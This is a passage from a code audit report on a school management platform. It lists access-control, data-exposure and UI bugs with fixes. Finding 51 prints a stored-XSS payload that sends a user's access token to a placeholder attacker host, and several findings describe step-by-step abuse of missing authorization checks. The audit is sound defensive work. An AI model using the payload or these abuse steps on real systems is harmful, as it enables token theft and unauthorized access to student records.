- **Fix:** Gate the UI with the existing helper: in AssessmentInfoCard.tsx wrap the buttons at :57-68 in `can(user, 'manage_academic_setup')` (from campusly-frontend/src/lib/permissions.ts:37, user from useAuthStore), and in TermSummarySubjectChip.tsx:36-39 render 'Weightings not set — ask your HOD' with the cog hidden when the capability is absent. If teachers are meant to configure their own subjects, instead scope manage_academic_setup in campusly-backend/src/common/permissions.ts:38 and mirror the change in the frontend file plus both permissions.snapshot.json files per the CLAUDE.md rule.

### 41. Gradebook read endpoints skip the teacher-ownership check the rest of the codebase enforces

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Academic/routes.ts:261`
- **Failure:** Teacher A (Grade 3 register class only) calls GET /api/students/search-roster?q= to list every learner in the school, picks any Grade 12 learner's id, then calls GET /api/academic/students/<that id>/term-detail?academicYear=2026. The response is that learner's full per-subject, per-assessment mark breakdown for a class Teacher A does not teach. Substituting any classId into GET /api/academic/term-summary?classId=...&academicYear=2026 returns the whole cohort matrix for that class. Both are reachable from the browser session the gradebook already holds — no privilege escalation needed.
- **Fix:** In MiscController.getTermSummary and getSubjectTrend (misc.controller.ts:67-107) call the existing `assertTeacherCanAccessClass(user, classId, schoolId)` helper (export it from Academic/controllers/class.controller.ts:8 or lift it into a shared util). In getStudentTermDetail (:111-135) resolve the student's classId first and run `GradeService.teacherCanAccessClass` the way Report/helpers.ts:43-47 already does. For getAssessmentMarks (:160), load the assessment, take its classId, and apply the same assertion.

### 42. markPaper/markPaperText response omits paperId, paperType, classId, images and studentId — the post-marking review screen loses auto-create, page previews and PDF

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/AITools/service-marking.ts:300`
- **Failure:** Teacher goes to Mark Papers, picks a finalised assessment paper, picks a student, chooses 'Photographed', uploads 3 pages and waits for the AI. The review screen appears with the marks — but the three page thumbnails and the 'View all 3 pages' button are missing, and there is no 'Download PDF' button, even though the images are on disk and GET /ai-tools/markings/:id/pdf would serve them. Clicking 'Issue Result' opens a dialog whose gradebook-entry picker is marked required and is populated with every assessment in the school (wrong class, wrong subject) instead of silently auto-creating one from the paper. The teacher has to leave, open History, click the eye icon to re-fetch the marking via GET /markings/:id (which returns the full lean document) and only then gets the intended screen.
- **Fix:** Extend MarkPaperResult/toResult in campusly-backend/src/modules/AITools/service-marking.ts:32-43 and :300-321 with paperId, paperType, studentId, classId, images, imageCount, issuedToStudent, issuedAt, createdAt — or simply `return marking.toObject() as IPaperMarking` so the POST /mark-paper and POST /mark-paper-text responses have the same shape as GET /ai-tools/markings/:id.

### 43. Batch confirm marks the entire class synchronously inside the HTTP request — the progress-polling UI never runs and a proxy timeout strands the teacher

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/AITools/service-marking-batch-confirm.ts:48`
- **Failure:** Teacher uploads 30 students' pages via Mark Papers → Whole class, reviews the matches and clicks 'Confirm & Mark 30 students'. The button changes to 'Confirming...' and stays there for many minutes (3 concurrent Claude vision calls at a time) with no progress indication whatsoever. If the reverse proxy or load balancer closes the idle connection first, confirmBatch's catch fires, a 'Confirm failed' toast appears, onConfirmed() never runs, and the screen stays on the review list — while the server is still marking. Clicking Confirm again now returns 400 'Batch in unexpected state: marking', so the teacher believes the batch is broken and has no way to see the markings that are in fact being produced.
- **Fix:** In confirmBatch, respond as soon as the status flips to 'marking': move the queue-drain Promise into a fire-and-forget `void runMarkingQueue(...)` (the same pattern createBatch already uses at service-marking-batch.ts:52), persist running spawned/failed counters on the MarkingBatch document, and return 202 immediately. Then have MarkingBatchProgress poll those counters for real progress.

### 44. No teacher-ownership scoping on markings — any teacher can read, edit and re-issue another teacher's marks

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/AITools/service-marking-queries.ts:19`
- **Failure:** Teacher A (Grade 4 Maths) opens Mark Papers → History. Under a header that says 'Every paper you've marked', the table lists every marking in the whole school — including Grade 11 Physical Sciences papers marked by Teacher B for students Teacher A does not teach. Teacher A clicks the eye icon on one of Teacher B's records, edits marksAwarded on any question, clicks 'Save adjustments' (PUT /markings/:id succeeds), then clicks the send icon and issues it. publishMarkToGradebook upserts on {assessmentId, studentId} and overwrites the mark Teacher B already published, and marking.issuedBy is rewritten to Teacher A, so the record no longer shows who actually marked it.
- **Fix:** In campusly-backend/src/modules/AITools/service-marking-queries.ts, thread the caller's role and userId into listMarkings/getMarkingById/updateMarking/issueMarking and add `teacherId: new mongoose.Types.ObjectId(teacherUserId)` to each query when role === 'teacher' (leave school-wide access for school_admin/super_admin). The `{ teacherId: 1, schoolId: 1 }` index at model-marking.ts:111 already supports it.

### 45. Client accepts 20MB images but Multer caps at 5MB — typical phone photos fail the upload with an opaque error

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/ai-tools/ImageDropzone.tsx:10`
- **Failure:** A teacher photographs an A4 answer sheet with a modern phone (48MP JPEGs are routinely 6-9MB). The dropzone accepts the file because it is under its advertised 20MB limit and shows the thumbnail. On submit, Multer aborts with LIMIT_FILE_SIZE, errorHandler returns a generic 500, and useTeacherMarking.markPaper:156 toasts axios's raw message — 'Request failed with status code 500'. The teacher retries with the same photo and gets the same message, with nothing anywhere telling them the file is too big. Same failure on the whole-class batch upload.
- **Fix:** Align the two limits — either raise MAX_FILE_BYTES in campusly-backend/src/modules/AITools/service-marking-images.ts:7 to 20MB, or drop MAX_SIZE_MB in ImageDropzone.tsx:10 to 5 and downscale via canvas before base64 — and wrap markingUpload.array()/batchUpload.array() in routes.ts:102/:134 with the `err instanceof multer.MulterError` handler already used in Student/photo.controller.ts:63 so the size failure returns a 400 with a readable message.

### 46. Import wizard redirects to /import/undefined — the create response has no `id`, so every conversion ends on a dead page

- **Section:** n/a
- **Location:** `src/hooks/usePaperImport.ts:30`
- **Failure:** Teacher goes to /teacher/curriculum/import, picks a CAPS node, uploads a worksheet PDF, sets enhancement options, clicks 'Start Conversion'. The POST returns 201 and the job really is queued, but the browser navigates to /teacher/curriculum/import/undefined. usePaperImportPoll then GETs /paper-imports/undefined, which throws a Mongoose CastError server-side; the catch at usePaperImportPoll.ts:37 silently re-arms the timer, so the teacher stares at a spinner indefinitely and never sees progress or results for the import they just paid AI tokens for. Only a teacher who happens to click 'Converted papers' ever finds the job.
- **Fix:** In src/hooks/usePaperImport.ts change createJob to read the flat field: `const { jobId } = response.data as { jobId: string }; return jobId;` (return `Promise<string>`), and in src/app/(dashboard)/teacher/curriculum/import/page.tsx:71 push `/teacher/curriculum/import/${jobId}`. Alternatively make PaperImportController.create respond `res.status(201).json({ data: job.toObject() })` so unwrapResponse + normalizeIds produce `id` like every other endpoint.

### 47. Imported fill_blank blocks crash the teacher preview page (TypeError on undefined `data.text`)

- **Section:** n/a
- **Location:** `src/components/content/renderers/FillBlankBlock.tsx:30`
- **Failure:** Teacher converts a worksheet containing fill-in-the-blank questions (the importer offers fill_blank for lesson, worksheet and activity kinds). Conversion completes, the results list shows the new resource, teacher clicks 'Preview' → /teacher/curriculum/preview/<resourceId>. BlockRenderer routes the fill_blank block to FillBlankBlock, `data.text` is undefined because the stored JSON has `template`, and the render throws — the entire preview page blows up instead of showing the converted worksheet. The same crash hits the textbook reader, which uses the same BlockRenderer.
- **Fix:** In src/components/content/renderers/FillBlankBlock.tsx normalise at parse time: after JSON.parse, derive `const rawText = data.text ?? data.template ?? block.content;` guard `typeof rawText === 'string'` (fall back to `block.content`), convert `{{n}}` markers to `___`, and use that everywhere `data.text` is used today (lines 30 and 63). Apply the same defensive read in StepRevealBlock.tsx:17-20, where the importer sends `{steps:[{prompt,reveal}]}` but the renderer reads `{title,content}` and silently renders blank steps.

### 48. AI-generated interactive blocks render empty — generator writes answers into `metadata`, renderers only read JSON in `content`

- **Section:** n/a
- **Location:** `src/components/content/renderers/QuizBlock.tsx:100`
- **Failure:** Teacher opens a lesson at /teacher/lessons/<id>, adds a worksheet/activity/study-notes material and clicks Generate (or 'Generate all placeholders'). The backend creates a ContentResource with source 'ai_generated'. The teacher then finds it on /teacher/curriculum/content and clicks Preview. Every MCQ renders as a blank 'Type your answer...' text input with no options and no correct answer, because JSON.parse(block.content) throws on plain question text and QuizBlock falls through to the short_answer branch. match_columns and ordering blocks render as empty widgets, and fill_blank renders with `blanks: []` so the local correctness check marks every answer wrong.
- **Fix:** Pick one contract and enforce it in campusly-backend/src/modules/ContentLibrary/service-generation.ts parseAIResponseToBlocks: serialise the answer payload into `content` in the shape the renderers already accept — quiz → `JSON.stringify({question: content, type:'mcq', options: metadata.options.map((t,i)=>({label:'ABCD'[i], text:t, isCorrect: t===metadata.correctAnswer}))})`, fill_blank → `{text, blanks}`, match_columns → `{left,right,correctPairs}`, ordering → `{items,correctOrder}`. Otherwise add a `block.metadata` fallback inside normaliseQuiz (QuizBlock.tsx:29) and the equivalent memo in FillBlankBlock/MatchColumnsBlock/OrderingBlock.

### 49. Imported image/page-fallback blocks render as broken images — worker stores JSON plus a relative /api path in `content`

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/PaperImport/service-worker.ts:351`
- **Failure:** Teacher imports any scanned paper containing a diagram or figure (the transcriber is instructed to emit image blocks with a cropBox for anything it can't transcribe), or imports a scan whose median confidence falls under 0.55 so the whole resource falls back to page images. Conversion reports success, but on /teacher/curriculum/preview/<resourceId> every figure and every fallback page shows a broken-image icon. The 'needs review' case — precisely when the teacher must compare against the original scan — displays nothing at all.
- **Fix:** Two changes. (1) In campusly-backend/src/modules/PaperImport/service-worker.ts stage5Finalise, put the plain URL in `content` and move `alt` into metadata (`content: pageImageUrl(...)`, `metadata: { alt: 'Page '+p, needsReview: true }`) at lines 351, 370 and 373. (2) These endpoints require a Bearer token, so a bare <img> still fails — render them the way getMarkingImageUrl-backed views do: fetch via apiClient with `responseType:'blob'` into an object URL, and build the base from NEXT_PUBLIC_API_URL rather than a root-relative `/api` path.

### 50. "Create Manually" always 400s when the resource has any content block — frontend strips `blockId`, backend requires it

- **Section:** n/a
- **Location:** `src/components/content/ResourceFormDialog.tsx:140`
- **Failure:** Teacher opens /teacher/curriculum/content, picks a curriculum node, clicks 'Create Manually', fills in title/subject/grade, uses the 'Add a block...' select to add a Text block, and clicks 'Create Resource'. The POST body's blocks[0] has no blockId, Zod rejects it, the API returns 400 and useContentLibrary surfaces the toast 'Failed to create resource'. The only resource a teacher can successfully create is one with zero blocks — which ReviewService.submitForReview (service-review.ts:23-25) then refuses to submit because `blocks.length === 0`. Manual authoring is completely unusable.
- **Fix:** Stop stripping the id: change src/components/content/ResourceFormDialog.tsx:140 to `blocks: blockList` and change `CreateResourcePayload.blocks` in src/types/content-library.ts:95 from `Omit<ContentBlockItem,'blockId'>[]` to `ContentBlockItem[]`. Make the same change at src/components/content/ai-studio/PreviewStep.tsx:170 so the update path doesn't reintroduce it. (A server-side `.default(() => crypto.randomUUID())` on contentBlockSchema.blockId would also work but leaves the client and server disagreeing about block identity.)

### 51. Stored XSS in MermaidBlock: mermaid runs with securityLevel 'loose' and the SVG is injected with dangerouslySetInnerHTML

- **Section:** n/a
- **Location:** `src/components/content/renderers/MermaidBlock.tsx:30`
- **Failure:** A teacher (or an HOD, or a prompt-injected generation whose source PDF or free-text instructions steer the model) ends up with an image block whose content is e.g. `graph TD; A["<img src=x onerror='fetch(String.fromCharCode(47,47)+evilHost+localStorage.accessToken)'>"]` and metadata.renderer='mermaid'. Every subsequent viewer of that resource — the teacher preview at /teacher/curriculum/preview/<id>, the textbook reader, and students once it is approved — executes the payload in their own session, which can exfiltrate the accessToken that api-client.ts:11 stores in localStorage.
- **Fix:** In src/components/content/renderers/MermaidBlock.tsx change the initialize call (line 27-39) to `securityLevel: 'strict'` and add `flowchart: { useMaxWidth: false, htmlLabels: false }`. If a diagram genuinely needs HTML labels, keep 'loose' but run the returned `svg` through DOMPurify with `USE_PROFILES: { svg: true, svgFilters: true }` before both dangerouslySetInnerHTML sites (lines 92 and 110).

### 52. /api/paper-imports has no role authorization — any authenticated user (student, parent) can start AI import jobs

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/PaperImport/routes.ts:9`
- **Failure:** A student or parent logs in normally, takes their access token from localStorage, and POSTs a 25 MB PDF to /api/paper-imports with any subjectId/gradeId/curriculumNodeId. The job is accepted, the BullMQ worker runs the full Claude vision pipeline (segment + per-segment transcribe + up to 4 enhancement passes), AIUsageLog rows are written against the school, and ResourcesService.createResource stores ContentResource docs with createdBy = the student's user id. They can run two at a time and repeat as soon as each finishes, with no daily cap.
- **Fix:** In campusly-backend/src/modules/PaperImport/routes.ts add `import { authorize } from '../../middleware/index.js';` and `router.use(authorize('super_admin','school_admin','principal','hod','teacher'));` immediately after line 9, mirroring ContentLibrary/routes.ts READ_ROLES. Also add a `checkUsageLimit(schoolId,'maxAiGenerationsPerDay')` guard in PaperImportController.create alongside the existing concurrency check, since this pipeline is far more expensive than the text generator that already has one.

### 53. Moderation queue populates paperId against the wrong model, so reviewing a paper silently does nothing

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/model.assessment.ts:217`
- **Failure:** A plain school teacher opens /teacher/papers/<paperId>, clicks 'Submit for Moderation' (the only button they get — canFinaliseDirectly is false for role 'teacher'), and a PaperModeration row is written. A school_admin then types /teacher/workbench/papers/moderation. Every card in the Review Queue renders the title as 'Paper: ' with nothing after it, because populate resolved the AssessmentPaper id against the generatedpapers collection and set paperId to null. Clicking the card opens ModerationReviewForm; choosing Approve and pressing Submit Review hits `if (!selectedPaperId) return;` and closes the dialog with no network request, no toast, no console error. The teacher's paper stays 'draft', so PaperDetailAssignmentsTab cannot assign it (addAssignment throws 'Only finalised papers can be assigned to a class.') and PaperDetailMarkingTab stays blocked.
- **Fix:** In campusly-backend/src/modules/TeacherWorkbench/model.assessment.ts change `ref: 'GeneratedPaper'` to `ref: 'AssessmentPaper'` on paperModerationSchema.paperId (line 217) and paperMemoSchema.paperId (line 165) — those subsystems only ever store AssessmentPaper ids. In campusly-frontend/src/app/(dashboard)/teacher/workbench/papers/moderation/page.tsx use `resolveId(moderation.paperId)` (already exported from lib/api-helpers.ts) instead of assuming a raw string, and replace the silent `if (!selectedPaperId) return;` with a `toast.error(...)`. Add a nav entry for ROUTES.TEACHER_WORKBENCH_MODERATION in lib/constants.ts or drop the route.

### 54. Paper assignments, marking roster and submissions are school-scoped but not owner-scoped

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/QuestionBank/service-paper-assignments.ts:88`
- **Failure:** Teacher B, authenticated in the same school, obtains teacher A's paper id (shared link, screenshot, log, or ObjectId enumeration). `GET /api/question-bank/papers/<teacherA-paper>/assignments` returns the class assignments — no ownership check anywhere in the chain. `DELETE /api/question-bank/papers/<teacherA-paper>/assignments/<assignmentId>` then removes it: a class part-way through a digital test loses access (getStudentPaperView throws 'Paper is not assigned to this class for digital take') and teacher A's Marking tab roster for that class disappears. `GET .../marking-roster` and `GET .../submissions` likewise return other teachers' student names, admission numbers, submission status and per-student percentages.
- **Fix:** Thread `user.id` / `user.role` from controller-papers.ts (getPaperAssignments, postPaperAssignment, deletePaperAssignment, getMarkingRoster) and controller-submissions.ts (getPaperSubmissions, getSubmissionHandler) into listAssignments/addAssignment/removeAssignment/getPaperMarkingRoster/listSubmissionsForPaper, and call `assertCanEditPaper(paper, actorId, actorRole, 'read' | 'update')` right after findPaperOrThrow — exactly the pattern getPaperPdfBuffer already uses in service-papers-pdf-finalise.ts.


---

## MEDIUM

### 1. Student assignment submission files are served from /uploads with no authentication

- **Section:** n/a
- **Location:** `campusly-backend/src/app.ts:234`
- **Failure:** Two defects in one path. (a) Teacher opens /teacher/assignments/<id>, Submissions tab, clicks 'Mark', and clicks the attached PDF in AssignmentMarkingDialog — the href is the relative '/uploads/assignment-submissions/<uuid>.pdf', which resolves to http://localhost:3500/uploads/... and returns a Next.js 404, so the submitted work cannot be opened while marking. (b) Once that link is fixed to point at the API origin, anyone holding the resulting http://<api>/uploads/assignment-submissions/<uuid>.pdf URL (forwarded link, proxy log, shared screenshot) downloads the student's work with no Authorization header, because app.ts gates only /markings/ and /markings-batch/.
- **Fix:** In campusly-backend/src/app.ts extend the existing guard to `req.path.startsWith('/assignment-submissions/')` alongside the markings checks, and add an authenticated streaming route on Assignment/routes.ts (e.g. GET /submissions/:submissionId/files/:filename, authorize('teacher','school_admin','super_admin')) that resolves the submission through getSubmissionById — which already applies schoolId + assignmentAccessFilter — before piping the file. Then change AssignmentMarkingDialog.tsx's `href={f.url}` to hit that API route so the link actually works.

### 2. Re-marking a published assignment submission silently desynchronises the gradebook

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Assignment/service.ts:705`
- **Failure:** Teacher creates an assignment and UNTICKS 'Auto-publish marks to gradebook' on the publish step. On the Submissions tab they mark a student 40/50 and click 'Save & publish to gradebook' — the Mark row is upserted at 40 and the badge reads 'Published · 80%'. They later spot an addition error, click 'Review' on that same student, change the rubric to total 30/50 and click 'Save (don't publish)'. markSubmission recomputes totalMark=30 and resets status to 'marked', but the Mark row still reads 40. The gradebook and the printed report card carry 40 while the assignment screen shows 30, and the only on-screen hint is the badge quietly changing from 'Published' back to 'Marked'.
- **Fix:** In campusly-backend/src/modules/Assignment/service.ts markSubmission, capture the pre-existing status before overwriting it and, when the submission was already 'published' and shouldPublish is false, either re-run publishAssignmentGrade with the new totalMark (keeping the gradebook authoritative) or explicitly retract the Mark row. Do not leave a stale Mark. Surface the state in AssignmentSubmissionsTab.tsx's statusBadge so a 'marked-after-publish' submission is visibly flagged.

### 3. 'Total marks' is a required field in both homework create flows but the backend always overwrites it

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Homework/service.ts:290`
- **Failure:** Teacher builds an exercise homework at /teacher/homework/new. Step 1 will not let them press Next until they type a Total marks value, so they enter 50. Step 3 reviews back 'Total marks 50'. They press 'Assign Homework'. resolveCreatePayload recomputes totalMarks as the sum of the picked questions' marks (say 18) and stores 18. The detail page then shows 'Total marks: 18' with no explanation of where 50 went. The same discard happens for reading homework created from AssignHomeworkDialog.
- **Fix:** Pick one owner. Simplest: drop the totalMarks Input from HomeworkWizardStep1.tsx and the `state.totalMarks > 0` clause from isHomeworkStep1Ready, and have HomeworkWizardStep3.tsx show the derived total from the picked quiz's totalPoints / the selected questions' marks; do the same for AssignHomeworkDialog.tsx. If teacher-set totals are actually wanted, invert resolveCreatePayload to honour a supplied totalMarks and derive only when it is omitted.

### 4. Re-grade button leaves the row stuck on 'pending' — the async result is never polled or refetched

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useTeacherHomeworkSubmissions.ts:37`
- **Failure:** Teacher opens /teacher/homework/<id>, clicks the circular-arrow re-grade icon on a submission. A 'Regrade triggered' toast fires, the badge flips to 'pending' and the Mark column shows '— / 20'. gradeSubmissionAsync completes on the server a few seconds later and writes the new mark, but the row never updates. The teacher waits, concludes the re-grade hung, and either clicks it again (bumping gradingGeneration and re-burning an AI call) or navigates away without ever seeing the result.
- **Fix:** In campusly-frontend/src/hooks/useTeacherHomeworkSubmissions.ts, after a successful regrade start a bounded poll of refetch() (e.g. every 3s, max ~10 attempts, stop as soon as that submission's gradingStatus !== 'pending') and clear the interval in a useEffect cleanup. Expose a per-row 'regrading' flag so HomeworkSubmissionsTable.tsx can render 'Re-grading…' instead of a bare 'pending' badge.

### 5. Assignments list is silently capped at 20 rows with no pagination, and the on-screen count reports the page size as the total

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/assignments/page.tsx:41`
- **Failure:** Teacher who has created 27 assignments over a term opens /teacher/assignments. Only the 20 most recent render, the counter under the filter reads '20 assignments', and there is no pager or load-more. Typing an older assignment's title into the DataTable search box returns nothing, because the search filters the truncated in-memory page rather than querying the server, so seven assignments are simply unreachable from the portal.
- **Fix:** In campusly-frontend/src/hooks/useTeacherAssignments.ts keep the meta the PaginatedResponse type already declares (`setMeta({ total, page, totalPages })`) and accept page/limit in fetchAssignments' params. In teacher/assignments/page.tsx render `meta.total` in the counter and add prev/next controls driving the page param; route DataTable's search term into the backend `search` query (listAssignments already supports it at service.ts:185) instead of filtering client-side.

### 6. Assignments list has no error state and unmounts its filter bar on every refetch

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/assignments/page.tsx:125`
- **Failure:** The API is down, or requireModule rejects the school. Teacher opens /teacher/assignments, a toast flashes for a few seconds and disappears, and the page settles on 'No assignments yet — Draft your first assignment with AI' with a New Assignment CTA. A teacher who has 15 assignments concludes they were deleted, or starts recreating one. Separately, on a healthy load, changing the Status select from All to Published replaces the entire page with a centred spinner, dropping keyboard focus and the filter control itself before the list returns.
- **Fix:** Add `const [error, setError] = useState<string | null>(null)` to campusly-frontend/src/hooks/useTeacherAssignments.ts, set it in fetchAssignments' catch, clear it on success, and return it — mirroring useTeacherHomework.ts. In teacher/assignments/page.tsx replace the line-125 early return with the render pattern from teacher/homework/page.tsx:74-96: keep PageHeader and the filter row always mounted, and swap only the table region between a skeleton, an AlertTriangle error EmptyState, the empty EmptyState, and the DataTable.

### 7. Homework list fires one submissions request per homework (up to 100 parallel calls) on every page load

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useTeacherHomework.ts:30`
- **Failure:** Teacher with 60 homework items opens /teacher/homework. After the list resolves the hook issues 60 concurrent GET /homework/:id/submissions calls, each returning every student's full answer payload just so the UI can show two integers per row in HomeworkListTable's submission-count column. On a school connection the counts column stays blank for several seconds after the list appears, and thirty teachers doing this at first bell produces an avoidable load spike on the API and Mongo.
- **Fix:** Add a counts endpoint to campusly-backend/src/modules/Homework (e.g. GET /homework/submission-counts?homeworkIds=a,b,c) backed by a single HomeworkSubmission.aggregate grouped by homeworkId with $sum on a graded predicate — and cast schoolId with `new mongoose.Types.ObjectId(schoolId)` in the $match, since aggregation does not auto-cast. Then collapse fetchSubmissionCounts in useTeacherHomework.ts to one request.

### 8. AI draft-generation endpoints have no rate limiting

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Assignment/routes.ts:24`
- **Failure:** Any authenticated teacher — or anyone with a leaked teacher token — scripts a loop against POST /api/assignments/generate with a valid subject/grade/topic and a long instructions string. Each request runs AIService.generateJSON against the paid model, nothing is persisted so there is no natural cap, and there is neither a per-user limiter on the route nor a global one in app.ts. The AI spend and the Node request pool can both be exhausted in minutes. The only guard in the product is the Regenerate button's `disabled={generating}` in the assignment wizard, which is client-side only.
- **Fix:** Add an `ai` entry to RATE_LIMITS in campusly-backend/src/common/constants.ts (alongside the existing `auth` entry) and apply `createRateLimiter(RATE_LIMITS.ai.windowMs, RATE_LIMITS.ai.max)` — already exported from middleware/index.ts and used at Admissions/routes.ts:58 — to POST /generate in Assignment/routes.ts and POST /comprehension-questions in Homework/routes.ts.

### 9. Message draft is cleared before the send resolves — failed sends silently destroy the typed text

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/messaging/MessageView.tsx:36`
- **Failure:** Teacher writes a long reply to a parent and presses Enter. Connectivity drops, or the parent-side thread was closed in the meantime (backend 400 'This thread has been closed'). The textarea empties instantly, only a transient error toast appears, and the typed text is unrecoverable — the teacher must retype it from memory.
- **Fix:** Change `onSend` in MessageViewProps (src/components/messaging/MessageView.tsx:14) to `(content: string) => Promise<boolean>`, make handleSend `await onSend(text)` and only `setDraft('')` when it returns true. Propagate the result from teacher/messages/page.tsx handleSend (line 39-42) by returning `(await sendMessage(activeThreadId, content)) !== null`.

### 10. Notice board shows Pin/Edit/Delete on posts the teacher cannot manage — every click 403s

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/app/(dashboard)/teacher/notice-board/page.tsx:99`
- **Failure:** The principal posts a school-wide notice. A teacher opens /teacher/notice-board and sees Pin / Edit / Delete beneath it. Clicking Delete opens the "This cannot be undone" ConfirmDialog; confirming fires DELETE /notice-board/:id, gets 403 'You can only delete your own posts', and page.tsx:63-66 shows the generic `toast.error('Failed to delete post')` and rethrows so the confirm dialog stays open with no explanation. Choosing Edit instead lets the teacher type a full revision that is then discarded by the same 403.
- **Fix:** Compute the permission per post rather than per page: in src/components/notice-board/NoticeBoardFeed.tsx accept the current user id and pass `canManage={canManage && post.authorId === currentUserId}` to each PostCard (authorId is already on NoticeBoardPost). Also replace the generic strings in teacher/notice-board/page.tsx:63-66 and 143-146 with `extractErrorMessage(err, ...)` from src/lib/api-helpers.ts.

### 11. A just-scheduled message disappears from the UI until a full page reload

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/app/(dashboard)/teacher/communication/page.tsx:86`
- **Failure:** Teacher composes a message, ticks "Send later", picks tomorrow 08:00 and submits. The toast says "Message scheduled successfully!" and the dialog closes — but the page looks exactly as before: no Scheduled Messages card (it is hidden while the stale `scheduled` array is empty) and no row in the sent history (filtered out by status 'scheduled'). Unable to confirm it worked, the teacher schedules the same message again.
- **Fix:** Destructure `fetchScheduled` from useScheduledMessages at src/app/(dashboard)/teacher/communication/page.tsx:51 and call it after a successful `scheduleMessage` (and after `sendMessage`, since a due item flips from scheduled to sent) inside the onSubmit try block at lines 85-91.

### 12. Thread "Re: <learner>" context never renders — backend populates only `admissionNumber`

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/hooks/useMessaging.ts:33`
- **Failure:** A teacher with several open parent threads opens /teacher/messages. Each list row shows only the parent's name with no learner badge, and opening a thread shows a header with no "Re: <learner>" line. When one parent has two children at the school, or two parents share a surname, the teacher has no on-screen cue as to which child a thread is about and can reply about the wrong learner. The same blank rendering hits the conference schedule's "Student:" line.
- **Fix:** In campusly-backend/src/modules/Messaging/service.ts:190 and :209 change to `.populate({ path: 'studentId', select: 'admissionNumber userId', populate: { path: 'userId', select: 'firstName lastName' } })`, then in src/hooks/useMessaging.ts:32-34 read the name off `studentRaw.userId` with `admissionNumber` as fallback. Apply the identical populate change to Conference/service-bookings.ts:135 and :169 for the studentId (and parentId) chains.

### 13. Meetings page swallows fetch errors into a misleading empty state, and a failed "Complete" produces an unhandled rejection with no error toast

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/hooks/useMeetings.ts:70`
- **Failure:** (a) GET /api/meetings/teacher/slots errors (500, or an auth/module rejection). The teacher sees "No meeting slots — You don't have any meeting slots assigned yet. Contact your admin." and escalates to an admin who can see the slots exist. (b) Teacher clicks Complete on a slot whose booking was just cancelled; PATCH /meetings/slots/:id/complete rejects, the Complete dialog just sits there with the button re-enabled, no toast of any kind appears, and the only trace is an unhandled promise rejection in the console.
- **Fix:** In src/hooks/useMeetings.ts add an `error` state set inside the catch of loadTeacherSlots (lines 70-79) and render a distinct error block in src/app/(dashboard)/teacher/meetings/page.tsx:64-69 instead of the EmptyState. Wrap the request in markComplete (useMeetings.ts:101-104) in try/catch, `toast.error(extractErrorMessage(err, 'Failed to mark complete'))` and rethrow, and add a catch to TeacherScheduleView.tsx:41-47 so the rejection is handled rather than escaping the click handler.

### 14. Messaging `resolveUserInfo` does not scope the User lookup to the school — a cross-school recipient is accepted and notified

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Messaging/helpers.ts:14`
- **Failure:** An authenticated parent at School A POSTs /api/messaging/threads with `studentId` = their own child and `recipientId` = the User id of a teacher at School B. resolveUserInfo returns that teacher's real firstName/lastName with no school check, the teacher/parent role pair passes, and a thread is created carrying the foreign teacher's name plus a Notification row addressed to their userId. Because NotificationService.list keys only on recipientId, the School B teacher sees "New Message — <School A parent> sent you a message" in their notification feed for a thread that never appears in their thread list, while the attacker has confirmed and read that teacher's real name.
- **Fix:** Scope the lookup in campusly-backend/src/modules/Messaging/helpers.ts:14 to `User.findOne({ _id: userId, schoolId, isDeleted: false })`, and mirror the existing Parent check for the teacher branch by asserting a Staff/Teacher record exists in that schoolId. Separately, add `schoolId` to the filter in NotificationService.list (Notification/service.ts:40-43) so notifications can never leak across tenants.

### 15. Standalone-teacher allowlist dead-ends the "Take attendance" CTA on the class roster

- **Section:** n/a
- **Location:** `src/app/(dashboard)/layout.tsx:73`
- **Failure:** A standalone teacher opens Teaching Groups → picks a group → the roster page loads (allowed prefix '/teacher/classes'). The first card on the page is headed "Attendance" with a primary "Take attendance" button. They tap it, the layout renders null and immediately router.replace's back to /teacher. They see a flash of blank content then the home dashboard, with no toast, no error, and no indication the feature is not part of their plan.
- **Fix:** In src/app/(dashboard)/teacher/classes/[classId]/roster/page.tsx, wrap the attendance card (lines 194-209) in `{!isStandaloneTeacher && ( … )}` using the flag already computed at line 40 — or, if attendance is meant to be in scope, add '/teacher/attendance' to allowedPrefixes in src/app/(dashboard)/layout.tsx:73-92 and add the nav entry to STANDALONE_TEACHER_NAV. Separately, replace `return null` at layout.tsx:138 with a centred spinner so a blocked path never renders a blank screen.

### 16. Teacher home has no error state and its empty state is unreachable

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/page.tsx:73`
- **Failure:** A school-based teacher at a school without the homework or academic module loads /teacher. Both list calls come back 403 from the requireModule middleware, Promise.allSettled swallows them, the catch logs to the console, loading flips to false and all three totals stay 0 — so the page renders the greeting, the AI tiles and then nothing. The teacher cannot tell whether the dashboard is broken or they genuinely have no work, and reloading changes nothing. A teacher with a real zero-work day sees the same void instead of the 'All caught up' / 'Nothing due today' copy that was designed for it.
- **Fix:** Add `error: string | null` to DashboardData in src/hooks/useTeacherDashboard.ts, set it in the catch at line 203 and clear it on success, and return it at 226-234. In src/app/(dashboard)/teacher/page.tsx:73-87 render an inline error card with a retry button when error is set, and drop the `anyZoneHasContent` gate so the three zones always mount after loading and their own empty states do the talking.

### 17. Onboarding step 2 is non-idempotent — going Back and Next duplicates grades, subjects and classes

- **Section:** n/a
